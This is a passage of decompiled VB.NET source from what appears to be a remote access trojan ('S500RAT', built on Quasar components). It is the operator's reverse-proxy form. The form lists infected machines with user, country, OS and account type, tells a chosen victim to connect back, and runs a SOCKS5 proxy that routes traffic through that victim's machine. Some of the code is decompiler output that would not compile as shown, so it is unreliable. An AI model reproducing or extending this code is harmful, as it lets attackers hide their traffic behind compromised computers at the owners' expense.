Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Globalization
Imports System.Linq
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography.X509Certificates
Imports System.Threading
Imports System.Windows.Forms
Imports Gry.Helper
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Quasar.Common.Messages
Imports S5003G.Server.Messages
Imports S5003G.Server.Networking
Imports S5003G.Server.ReverseProxy
Imports S500RAT.My.Resources
Imports S500RAT.S5003g.Server.Models
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000077 RID: 119
	<DesignerGenerated()>
	Public Partial Class FormReverseProxy
		Inherits Form

		' Token: 0x0600123D RID: 4669 RVA: 0x000A3F08 File Offset: 0x000A2108
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormProxy_Load
			AddHandler MyBase.Resize, AddressOf Me.FormReverseProxy_Resize
			Me.QueueConnections = New Queue(Of KeyValuePair(Of Client, Boolean))()
			Me.ClientConnectionsLock = RuntimeHelpers.GetObjectValue(New Object())
			Me.LockClients = RuntimeHelpers.GetObjectValue(New Object())
			Me.random = New Random()
			Me.FormSize = False
			Me.ClientRunning = True
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000727 RID: 1831
		' (get) Token: 0x06001240 RID: 4672 RVA: 0x000A6B24 File Offset: 0x000A4D24
		' (set) Token: 0x06001241 RID: 4673 RVA: 0x000A6B2E File Offset: 0x000A4D2E
		Friend Overridable Property lstClients As AeroListView

		' Token: 0x17000728 RID: 1832
		' (get) Token: 0x06001242 RID: 4674 RVA: 0x000A6B37 File Offset: 0x000A4D37
		' (set) Token: 0x06001243 RID: 4675 RVA: 0x000A6B41 File Offset: 0x000A4D41
		Friend Overridable Property ColumnHeader1 As ColumnHeader

		' Token: 0x17000729 RID: 1833
		' (get) Token: 0x06001244 RID: 4676 RVA: 0x000A6B4A File Offset: 0x000A4D4A
		' (set) Token: 0x06001245 RID: 4677 RVA: 0x000A6B54 File Offset: 0x000A4D54
		Friend Overridable Property ColumnHeader2 As ColumnHeader

		' Token: 0x1700072A RID: 1834
		' (get) Token: 0x06001246 RID: 4678 RVA: 0x000A6B5D File Offset: 0x000A4D5D
		' (set) Token: 0x06001247 RID: 4679 RVA: 0x000A6B67 File Offset: 0x000A4D67
		Friend Overridable Property ColumnHeader3 As ColumnHeader

		' Token: 0x1700072B RID: 1835
		' (get) Token: 0x06001248 RID: 4680 RVA: 0x000A6B70 File Offset: 0x000A4D70
		' (set) Token: 0x06001249 RID: 4681 RVA: 0x000A6B7A File Offset: 0x000A4D7A
		Friend Overridable Property ColumnHeader4 As ColumnHeader

		' Token: 0x1700072C RID: 1836
		' (get) Token: 0x0600124A RID: 4682 RVA: 0x000A6B83 File Offset: 0x000A4D83
		' (set) Token: 0x0600124B RID: 4683 RVA: 0x000A6B8D File Offset: 0x000A4D8D
		Private Overridable Property imgFlags As ImageList

		' Token: 0x1700072D RID: 1837
		' (get) Token: 0x0600124C RID: 4684 RVA: 0x000A6B96 File Offset: 0x000A4D96
		' (set) Token: 0x0600124D RID: 4685 RVA: 0x000A6BA0 File Offset: 0x000A4DA0
		Friend Overridable Property PictureBox1 As PictureBox

		' Token: 0x1700072E RID: 1838
		' (get) Token: 0x0600124E RID: 4686 RVA: 0x000A6BA9 File Offset: 0x000A4DA9
		' (set) Token: 0x0600124F RID: 4687 RVA: 0x000A6BB3 File Offset: 0x000A4DB3
		Friend Overridable Property State As UILabel

		' Token: 0x1700072F RID: 1839
		' (get) Token: 0x06001250 RID: 4688 RVA: 0x000A6BBC File Offset: 0x000A4DBC
		' (set) Token: 0x06001251 RID: 4689 RVA: 0x000A6BC8 File Offset: 0x000A4DC8
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000730 RID: 1840
		' (get) Token: 0x06001252 RID: 4690 RVA: 0x000A6C0B File Offset: 0x000A4E0B
		' (set) Token: 0x06001253 RID: 4691 RVA: 0x000A6C15 File Offset: 0x000A4E15
		Friend Overridable Property Guna2Elipse2 As Guna2Elipse

		' Token: 0x17000731 RID: 1841
		' (get) Token: 0x06001254 RID: 4692 RVA: 0x000A6C1E File Offset: 0x000A4E1E
		' (set) Token: 0x06001255 RID: 4693 RVA: 0x000A6C28 File Offset: 0x000A4E28
		Friend Overridable Property ImageList1 As ImageList

		' Token: 0x17000732 RID: 1842
		' (get) Token: 0x06001256 RID: 4694 RVA: 0x000A6C31 File Offset: 0x000A4E31
		' (set) Token: 0x06001257 RID: 4695 RVA: 0x000A6C3C File Offset: 0x000A4E3C
		Friend Overridable Property Start As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Start
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Start_Click
				Dim start As Guna2GradientButton = Me._Start
				If start IsNot Nothing Then
					RemoveHandler start.Click, value2
				End If
				Me._Start = value
				start = Me._Start
				If start IsNot Nothing Then
					AddHandler start.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000733 RID: 1843
		' (get) Token: 0x06001258 RID: 4696 RVA: 0x000A6C7F File Offset: 0x000A4E7F
		' (set) Token: 0x06001259 RID: 4697 RVA: 0x000A6C89 File Offset: 0x000A4E89
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000734 RID: 1844
		' (get) Token: 0x0600125A RID: 4698 RVA: 0x000A6C92 File Offset: 0x000A4E92
		' (set) Token: 0x0600125B RID: 4699 RVA: 0x000A6C9C File Offset: 0x000A4E9C
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000735 RID: 1845
		' (get) Token: 0x0600125C RID: 4700 RVA: 0x000A6CA5 File Offset: 0x000A4EA5
		' (set) Token: 0x0600125D RID: 4701 RVA: 0x000A6CAF File Offset: 0x000A4EAF
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000736 RID: 1846
		' (get) Token: 0x0600125E RID: 4702 RVA: 0x000A6CB8 File Offset: 0x000A4EB8
		' (set) Token: 0x0600125F RID: 4703 RVA: 0x000A6CC4 File Offset: 0x000A4EC4
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.FrmClose_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000737 RID: 1847
		' (get) Token: 0x06001260 RID: 4704 RVA: 0x000A6D07 File Offset: 0x000A4F07
		' (set) Token: 0x06001261 RID: 4705 RVA: 0x000A6D14 File Offset: 0x000A4F14
		Friend Overridable Property ServerPort As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._ServerPort
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyPressEventHandler = AddressOf Me.ServerPort_KeyPress
				Dim value3 As EventHandler = AddressOf Me.ServerPort_TextChanged
				Dim serverPort As Guna2TextBox = Me._ServerPort
				If serverPort IsNot Nothing Then
					RemoveHandler serverPort.KeyPress, value2
					RemoveHandler serverPort.TextChanged, value3
				End If
				Me._ServerPort = value
				serverPort = Me._ServerPort
				If serverPort IsNot Nothing Then
					AddHandler serverPort.KeyPress, value2
					AddHandler serverPort.TextChanged, value3
				End If
			End Set
		End Property

		' Token: 0x17000738 RID: 1848
		' (get) Token: 0x06001262 RID: 4706 RVA: 0x000A6D72 File Offset: 0x000A4F72
		' (set) Token: 0x06001263 RID: 4707 RVA: 0x000A6D7C File Offset: 0x000A4F7C
		Friend Overridable Property Port As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._Port
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyPressEventHandler = AddressOf Me.Port_KeyPress
				Dim port As Guna2TextBox = Me._Port
				If port IsNot Nothing Then
					RemoveHandler port.KeyPress, value2
				End If
				Me._Port = value
				port = Me._Port
				If port IsNot Nothing Then
					AddHandler port.KeyPress, value2
				End If
			End Set
		End Property

		' Token: 0x17000739 RID: 1849
		' (get) Token: 0x06001264 RID: 4708 RVA: 0x000A6DBF File Offset: 0x000A4FBF
		' (set) Token: 0x06001265 RID: 4709 RVA: 0x000A6DC9 File Offset: 0x000A4FC9
		Friend Overridable Property StateConnection As UILabel

		' Token: 0x1700073A RID: 1850
		' (get) Token: 0x06001266 RID: 4710 RVA: 0x000A6DD2 File Offset: 0x000A4FD2
		' (set) Token: 0x06001267 RID: 4711 RVA: 0x000A6DDC File Offset: 0x000A4FDC
		Friend Overridable Property ErrorState As UILabel

		' Token: 0x1700073B RID: 1851
		' (get) Token: 0x06001268 RID: 4712 RVA: 0x000A6DE5 File Offset: 0x000A4FE5
		' (set) Token: 0x06001269 RID: 4713 RVA: 0x000A6DEF File Offset: 0x000A4FEF
		Friend Overridable Property ID As UILabel

		' Token: 0x1700073C RID: 1852
		' (get) Token: 0x0600126A RID: 4714 RVA: 0x000A6DF8 File Offset: 0x000A4FF8
		' (set) Token: 0x0600126B RID: 4715 RVA: 0x000A6E02 File Offset: 0x000A5002
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x1700073D RID: 1853
		' (get) Token: 0x0600126C RID: 4716 RVA: 0x000A6E0B File Offset: 0x000A500B
		' (set) Token: 0x0600126D RID: 4717 RVA: 0x000A6E15 File Offset: 0x000A5015
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x1700073E RID: 1854
		' (get) Token: 0x0600126E RID: 4718 RVA: 0x000A6E1E File Offset: 0x000A501E
		' (set) Token: 0x0600126F RID: 4719 RVA: 0x000A6E28 File Offset: 0x000A5028
		Public Property Client As Clients

		' Token: 0x1700073F RID: 1855
		' (get) Token: 0x06001270 RID: 4720 RVA: 0x000A6E31 File Offset: 0x000A5031
		' (set) Token: 0x06001271 RID: 4721 RVA: 0x000A6E3B File Offset: 0x000A503B
		Public Property F As FormS500

		' Token: 0x17000740 RID: 1856
		' (get) Token: 0x06001272 RID: 4722 RVA: 0x000A6E44 File Offset: 0x000A5044
		' (set) Token: 0x06001273 RID: 4723 RVA: 0x000A6E4E File Offset: 0x000A504E
		Public Property FullPath As String

		' Token: 0x17000741 RID: 1857
		' (get) Token: 0x06001274 RID: 4724 RVA: 0x000A6E57 File Offset: 0x000A5057
		' (set) Token: 0x06001275 RID: 4725 RVA: 0x000A6E61 File Offset: 0x000A5061
		Friend Property ParentClient As Clients

		' Token: 0x06001276 RID: 4726 RVA: 0x000A6E6C File Offset: 0x000A506C
		Private Sub FormProxy_Load(sender As Object, e As EventArgs)
			Try
				Me.Port.Text = Convert.ToString(Me.random.[Next](6066, 9090))
				Me.InitializeServer()
				Me.AutostartListening()
				Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
				Try
					Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3) })
				Catch ex As Exception
					Me.ClientInfo.Text = "Not found !"
				End Try
				Me.FormSize = True
				Me.MinimumSize = MyBase.Size
				Me.MaximumSize = MyBase.Size
			Catch ex2 As Exception
				Me.ErrorState.Text = ex2.Message
			End Try
		End Sub

		' Token: 0x06001277 RID: 4727 RVA: 0x000A6FAC File Offset: 0x000A51AC
		Private Sub AddClientToListview(client As Client)
			Dim flag As Boolean = client IsNot Nothing
			If flag Then
				Try
					Dim address As IPAddress = client.EndPoint.Address
					Dim array As String() = New String(8) {}
					Dim flag2 As Boolean = address IsNot Nothing
					Dim str As String
					If flag2 Then
						str = address.ToString()
					Else
						str = Nothing
					End If
					array(0) = " " + str
					Dim array2 As String() = array
					array2(1) = client.Value.Tag
					array2(2) = client.Value.UserAtPc
					array2(3) = client.Value.Version
					array2(6) = client.Value.CountryWithCode
					array2(7) = client.Value.OperatingSystem
					array2(8) = client.Value.AccountType
					Dim $VB$Local_lvi As ListViewItem = New ListViewItem(array2) With { .Tag = client, .ImageIndex = client.Value.ImageIndex }
					Dim lvi As ListViewItem = $VB$Local_lvi
					Me.lstClients.Invoke(New VB$AnonymousDelegate_0(Sub()
						Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.LockClients)
						Dim obj As Object = objectValue
						ObjectFlowControl.CheckForSyncLockOnValueType(obj)
						SyncLock obj
							Me.lstClients.Items.Add(lvi)
						End SyncLock
					End Sub))
					Me.UpdateWindowTitle()
				Catch ex As InvalidOperationException
				End Try
			End If
		End Sub

		' Token: 0x06001278 RID: 4728 RVA: 0x000A70E8 File Offset: 0x000A52E8
		Public Sub UpdateWindowTitle()
			Dim flag As Boolean = Not Me.Running
			If flag Then
				Me.Running = True
				Try
					MyBase.Invoke(New VB$AnonymousDelegate_0(Sub()
						Dim count As Integer = Me.lstClients.SelectedItems.Count
						Dim flag2 As Boolean = Me.lstClients.Items.Count > 0
						If flag2 Then
							Me.lstClients.Items(0).Selected = True
							Dim selectedClients As Client() = Me.GetSelectedClients()
							Dim flag3 As Boolean = selectedClients.Length <> 0
							If flag3 Then
								Me.ReverseProxyHandler = New ReverseProxyHandler(selectedClients)
								Me.StartSocks5()
								Me.RegisterMessageHandler()
								Me.StateConnection.Text = "Connected"
								Me.ServerPort.Enabled = True
								Me.ServerPort.[ReadOnly] = True
								Me.ID.ForeColor = Color.Green
								Me.StateConnection.ForeColor = Color.Green
								Me.Start.Text = "Stop listening"
								Me.Start.Enabled = True
							End If
						End If
					End Sub))
				Catch ex As Exception
					Me.ServerPort.Enabled = False
					Me.ServerPort.[ReadOnly] = False
				End Try
				Me.Running = False
			End If
		End Sub

		' Token: 0x06001279 RID: 4729 RVA: 0x000A7164 File Offset: 0x000A5364
		Private Sub AutostartListening()
			Dim autoListen As Boolean = SettingsPrx.AutoListen
			If autoListen Then
				Me.StartConnectionListener()
			End If
		End Sub

		' Token: 0x0600127A RID: 4730 RVA: 0x000A7184 File Offset: 0x000A5384
		Private Sub StartConnectionListener()
			Try
				Me.ListenServer.Listen(SettingsPrx.ListenPort, SettingsPrx.IPv6Support, SettingsPrx.UseUPnP)
			Catch ex As SocketException
				Dim flag As Boolean = ex.ErrorCode = 10048
				If flag Then
					Me.ErrorState.Text = "The port is already in use!"
				Else
					Me.ErrorState.Text = (If(("An unexpected socket error occurred:" + ex.Message), ""))
				End If
				Me.ListenServer.Disconnect()
			Catch ex2 As Exception
				Me.ErrorState.Text = (If(("An unexpected socket error occurred:" + ex2.Message), ""))
			End Try
		End Sub

		' Token: 0x0600127B RID: 4731 RVA: 0x000A726C File Offset: 0x000A546C
		Private Sub ClientConnected(client As Client)
			Dim queueConnections As Queue(Of KeyValuePair(Of Client, Boolean)) = Me.QueueConnections
			Dim obj As Object = queueConnections
			SyncLock obj
				Dim listening As Boolean = Me.ListenServer.Listening
				If Not listening Then
					Return
				End If
				Me.QueueConnections.Enqueue(New KeyValuePair(Of Client, Boolean)(client, True))
			End SyncLock
			Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.ClientConnectionsLock)
			Dim obj2 As Object = objectValue
			ObjectFlowControl.CheckForSyncLockOnValueType(obj2)
			SyncLock obj2
				Dim flag3 As Boolean = Not Me.ClientConnect
				If flag3 Then
					Me.ClientConnect = True
					ThreadPool.QueueUserWorkItem(AddressOf Me.ProcessClientConnections)
				End If
			End SyncLock
		End Sub

		' Token: 0x0600127C RID: 4732 RVA: 0x000A7344 File Offset: 0x000A5544
		Private Sub ProcessClientConnections(state As Object)
			While True
				Dim queueConnections As Queue(Of KeyValuePair(Of Client, Boolean)) = Me.QueueConnections
				Dim obj As Object = queueConnections
				Dim keyValuePair As KeyValuePair(Of Client, Boolean)
				SyncLock obj
					Dim flag2 As Boolean = Not Me.ListenServer.Listening
					If flag2 Then
						Me.QueueConnections.Clear()
					End If
					Dim flag3 As Boolean = Me.QueueConnections.Count = 0
					If flag3 Then
						Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.ClientConnectionsLock)
						Dim obj2 As Object = objectValue
						ObjectFlowControl.CheckForSyncLockOnValueType(obj2)
						SyncLock obj2
							Me.ClientConnect = False
						End SyncLock
						Exit For
					End If
					keyValuePair = Me.QueueConnections.Dequeue()
				End SyncLock
				Dim flag5 As Boolean = keyValuePair.Key IsNot Nothing
				If flag5 Then
					Dim flag6 As Boolean = Not keyValuePair.Value
					If flag6 Then
						Me.RemoveClientFromListview(keyValuePair.Key)
					Else
						Me.AddClientToListview(keyValuePair.Key)
					End If
				End If
			End While
		End Sub

		' Token: 0x0600127D RID: 4733 RVA: 0x000A7468 File Offset: 0x000A5668
		Private Sub RemoveClientFromListview(client As Client)
			Dim CS$<>8__locals1 As FormReverseProxy._Closure$__132-0 = New FormReverseProxy._Closure$__132-0(CS$<>8__locals1)
			CS$<>8__locals1.$VB$Me = Me
			CS$<>8__locals1.$VB$Local_client = client
			Dim flag As Boolean = CS$<>8__locals1.$VB$Local_client Is Nothing
			If Not flag Then
				Try
					Me.lstClients.Invoke(New MethodInvoker(Sub()
						Dim lockClients As Object = CS$<>8__locals1.$VB$Me.LockClients
						ObjectFlowControl.CheckForSyncLockOnValueType(lockClients)
						SyncLock lockClients
							Try
								Dim source As IEnumerable(Of ListViewItem) = CS$<>8__locals1.$VB$Me.lstClients.Items.Cast()
								Dim predicate As Func(Of ListViewItem, Boolean)
								If CS$<>8__locals1.$I1 IsNot Nothing Then
									predicate = CS$<>8__locals1.$I1
								Else
									Dim func As Func(Of ListViewItem, Boolean) = Function(lvi As ListViewItem) lvi IsNot Nothing AndAlso CS$<>8__locals1.$VB$Local_client.Equals(RuntimeHelpers.GetObjectValue(lvi.Tag))
									Dim func2 As Func(Of ListViewItem, Boolean) = func
									CS$<>8__locals1.$I1 = func
									predicate = func2
								End If
								Dim enumerator As IEnumerator(Of ListViewItem) = source.Where(predicate).GetEnumerator()
								If enumerator.MoveNext() Then
									Dim listViewItem As ListViewItem = enumerator.Current
									listViewItem.Remove()
								End If
							Finally
								Dim enumerator As IEnumerator(Of ListViewItem)
								If enumerator IsNot Nothing Then
									enumerator.Dispose()
								End If
							End Try
						End SyncLock
					End Sub))
					Me.UpdateWindowTitle()
				Catch ex As InvalidOperationException
				End Try
			End If
		End Sub

		' Token: 0x0600127E RID: 4734 RVA: 0x000A74E0 File Offset: 0x000A56E0
		Private Sub ClientDisconnected(client As Client)
			Dim queueConnections As Queue(Of KeyValuePair(Of Client, Boolean)) = Me.QueueConnections
			Dim obj As Object = queueConnections
			SyncLock obj
				Dim listening As Boolean = Me.ListenServer.Listening
				If Not listening Then
					Return
				End If
				Me.QueueConnections.Enqueue(New KeyValuePair(Of Client, Boolean)(client, False))
			End SyncLock
			Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.ClientConnectionsLock)
			Dim obj2 As Object = objectValue
			ObjectFlowControl.CheckForSyncLockOnValueType(obj2)
			SyncLock obj2
				Dim flag3 As Boolean = Not Me.ClientConnect
				If flag3 Then
					Me.ClientConnect = True
					ThreadPool.QueueUserWorkItem(AddressOf Me.ProcessClientConnections)
				End If
			End SyncLock
		End Sub

		' Token: 0x0600127F RID: 4735 RVA: 0x000A75B8 File Offset: 0x000A57B8
		Private Sub ServerState()
			Try
				Dim listening As Boolean
				MyBase.Invoke(New VB$AnonymousDelegate_0(Sub()
					Dim flag As Boolean = Not listening
					If flag Then
						Me.lstClients.Items.Clear()
					End If
				End Sub))
				Me.UpdateWindowTitle()
			Catch ex As InvalidOperationException
			End Try
		End Sub

		' Token: 0x06001280 RID: 4736 RVA: 0x000A7610 File Offset: 0x000A5810
		Private Sub InitializeServer()
			Dim serverCertificate As X509Certificate2 = New X509Certificate2(New X509Certificate2(Resources.ProxyCertificate))
			Me.ListenServer = New QuasarServer(serverCertificate)
			AddHandler Me.ListenServer.ServerState, Sub(a0 As Server, a1 As Boolean, a2 As UShort)
				Me.ServerState()
			End Sub
			AddHandler Me.ListenServer.ClientConnected, AddressOf Me.ClientConnected
			AddHandler Me.ListenServer.ClientDisconnected, AddressOf Me.ClientDisconnected
		End Sub

		' Token: 0x06001281 RID: 4737 RVA: 0x000A7684 File Offset: 0x000A5884
		Private Function GetPortSafe() As UShort
			Dim num As UShort
			Return If((Not UShort.TryParse(Me.Port.Text.ToString(CultureInfo.InvariantCulture), num)), 0US, num)
		End Function

		' Token: 0x06001282 RID: 4738 RVA: 0x000A76BC File Offset: 0x000A58BC
		Private Function GetSelectedClients() As Client()
			Dim clients As List(Of Client) = New List(Of Client)()
			Me.lstClients.Invoke(New MethodInvoker(Sub()
				Dim lockClients As Object = Me.LockClients
				ObjectFlowControl.CheckForSyncLockOnValueType(lockClients)
				SyncLock lockClients
					Dim flag2 As Boolean = Me.lstClients.SelectedItems.Count = 0
					If Not flag2 Then
						Dim $VB$Local_clients As List(Of Client) = clients
						Dim source As IEnumerable(Of ListViewItem) = Me.lstClients.SelectedItems.Cast()
						Dim predicate As Func(Of ListViewItem, Boolean)
						If FormReverseProxy._Closure$__.$I137-1 IsNot Nothing Then
							predicate = FormReverseProxy._Closure$__.$I137-1
						Else
							Dim func As Func(Of ListViewItem, Boolean) = Function(lvi As ListViewItem) lvi IsNot Nothing
							predicate = func
							FormReverseProxy._Closure$__.$I137-1 = func
						End If
						Dim source2 As IEnumerable(Of ListViewItem) = source.Where(predicate)
						Dim selector As Func(Of ListViewItem, Client)
						If FormReverseProxy._Closure$__.$I137-2 IsNot Nothing Then
							selector = FormReverseProxy._Closure$__.$I137-2
						Else
							Dim func2 As Func(Of ListViewItem, Client) = Function(lvi As ListViewItem) TryCast(lvi.Tag, Client)
							selector = func2
							FormReverseProxy._Closure$__.$I137-2 = func2
						End If
						$VB$Local_clients.AddRange(source2.[Select](selector))
					End If
				End SyncLock
			End Sub))
			Return clients.ToArray()
		End Function

		' Token: 0x06001283 RID: 4739 RVA: 0x000A7709 File Offset: 0x000A5909
		Private Sub RegisterMessageHandler()
			Me.ReverseProxyHandler.ProgressChanged += AddressOf Me.ConnectionChanged
			MessageHandler.Register(Me.ReverseProxyHandler)
		End Sub

		' Token: 0x06001284 RID: 4740 RVA: 0x000A7730 File Offset: 0x000A5930
		Private Sub UnregisterMessageHandler()
			MessageHandler.Unregister(Me.ReverseProxyHandler)
			Me.ReverseProxyHandler.ProgressChanged -= AddressOf Me.ConnectionChanged
		End Sub

		' Token: 0x06001285 RID: 4741 RVA: 0x000A7758 File Offset: 0x000A5958
		Private Sub ConnectionChanged(sender As Object, proxyClients As ReverseProxyClient())
			Dim reverseProxyHandler As Object = Me.ReverseProxyHandler
			SyncLock reverseProxyHandler
				Try
					Me.OpenConnections = proxyClients
					Me.State.Text = Conversions.ToString(Me.OpenConnections.Length)
					Dim flag2 As Boolean = Me.OpenConnections.Length > 0
					If flag2 Then
						Me.State.ForeColor = Color.Green
					Else
						Me.State.ForeColor = Color.White
					End If
				Catch ex As Exception
				End Try
			End SyncLock
		End Sub

		' Token: 0x06001286 RID: 4742 RVA: 0x000A7810 File Offset: 0x000A5A10
		Private Sub StartSocks5()
			Try
				Dim portSafe As UShort = Me.GetPortSafe11()
				Me.ReverseProxyHandler.StartReverseProxyServer(portSafe)
				Me.StatueProxy = True
			Catch ex As SocketException
				Me.ServerPort.Enabled = True
				Dim flag As Boolean = ex.ErrorCode = 10048
				If flag Then
					Me.ErrorState.Text = "The port is already in use!"
				Else
					Me.ErrorState.Text = (If(("An unexpected socket error occurred:" + ex.Message), ""))
				End If
			Catch ex2 As Exception
				Me.ErrorState.Text = (If(("An unexpected socket error occurred:" + ex2.Message), ""))
			End Try
		End Sub

		' Token: 0x06001287 RID: 4743 RVA: 0x000A78F8 File Offset: 0x000A5AF8
		Private Function GetPortSafe11() As UShort
			Dim s As String = Me.ServerPort.Text.ToString(CultureInfo.InvariantCulture)
			Dim num As UShort = 0US
			Return If((Not UShort.TryParse(s, num)), 0US, num)
		End Function

		' Token: 0x06001288 RID: 4744 RVA: 0x000A7930 File Offset: 0x000A5B30
		Private Sub StopSocks5()
			Dim statueProxy As Boolean = Me.StatueProxy
			If statueProxy Then
				Me.ReverseProxyHandler.StopReverseProxyServer()
				SettingsPrx.ReverseProxyPort = Me.GetPortSafe11()
				Me.UnregisterMessageHandler()
				Me.ReverseProxyHandler.Dispose()
			End If
			Me.StatueProxy = False
			Dim statuePort As Boolean = Me.StatuePort
			If statuePort Then
				Me.ListenServer.Disconnect()
			End If
			Console.WriteLine("Stoped.///")
		End Sub

		' Token: 0x06001289 RID: 4745 RVA: 0x000A79A0 File Offset: 0x000A5BA0
		Private Sub ServerPort_KeyPress(sender As Object, e As KeyPressEventArgs)
			Dim flag As Boolean = Not Char.IsNumber(e.KeyChar) And Not Char.IsControl(e.KeyChar)
			If flag Then
				e.Handled = True
			End If
		End Sub

		' Token: 0x0600128A RID: 4746 RVA: 0x000A79DC File Offset: 0x000A5BDC
		Private Sub Port_KeyPress(sender As Object, e As KeyPressEventArgs)
			Dim flag As Boolean = Not Char.IsNumber(e.KeyChar) And Not Char.IsControl(e.KeyChar)
			If flag Then
				e.Handled = True
			End If
		End Sub

		' Token: 0x0600128B RID: 4747 RVA: 0x000A7A18 File Offset: 0x000A5C18
		Private Sub Start_Click(sender As Object, e As EventArgs)
			Dim clientRunning As Boolean = Me.ClientRunning
			If clientRunning Then
				Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "Connect"
					msgPack.ForcePathObject("Port").AsString = Me.Port.Text
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Me.ClientRunning = False
				Catch ex As Exception
					Return
				End Try
			End If
			Try
				Me.Start.Enabled = False
				Me.ServerPort.Enabled = False
				Me.ID.ForeColor = Color.Red
				Me.StateConnection.ForeColor = Color.Silver
				Me.StateConnection.Text = "Plase Wait ..."
				Dim portSafe As UShort = Me.GetPortSafe()
				Dim flag As Boolean = portSafe = 0US
				If flag Then
					Me.ErrorState.Text = "Please enter a valid port"
				Else
					Dim flag2 As Boolean = Operators.CompareString(Me.Start.Text, "Start listening", False) = 0 AndAlso Not Me.ListenServer.Listening
					If flag2 Then
						Try
							Me.ListenServer.Listen(portSafe, False, False)
							Me.StatuePort = True
							Me.StateConnection.Text = "Coneection ..."
						Catch ex2 As SocketException
							Me.ServerPort.Enabled = True
							Dim flag3 As Boolean = ex2.ErrorCode = 10048
							If flag3 Then
								Me.ErrorState.Text = "The port is already in use!"
							Else
								Me.ErrorState.Text = (If(("An unexpected socket error occurred:" + ex2.Message), ""))
							End If
							Me.ListenServer.Disconnect()
						Catch ex3 As Exception
							Me.ListenServer.Disconnect()
						End Try
					Else
						Dim flag4 As Boolean = Operators.CompareString(Me.Start.Text, "Stop listening", False) = 0 AndAlso Me.ListenServer.Listening
						If flag4 Then
							Me.StateConnection.Text = "Disconnection ..."
							Me.ListenServer.Disconnect()
							Me.StopSocks5()
							Me.ID.ForeColor = Color.Red
							Me.StateConnection.ForeColor = Color.Silver
							Me.StateConnection.Text = "Not Connected"
							Me.StatuePort = False
							Me.ServerPort.[ReadOnly] = False
							Me.ID.ForeColor = Color.Red
							Me.StateConnection.ForeColor = Color.Silver
							Me.Start.Text = "Start listening"
							Me.Start.Enabled = True
						End If
					End If
				End If
			Catch ex4 As Exception
			End Try
		End Sub

		' Token: 0x0600128C RID: 4748 RVA: 0x000A7D60 File Offset: 0x000A5F60
		Private Sub FormReverseProxy_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x0600128D RID: 4749 RVA: 0x000A7DF4 File Offset: 0x000A5FF4
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

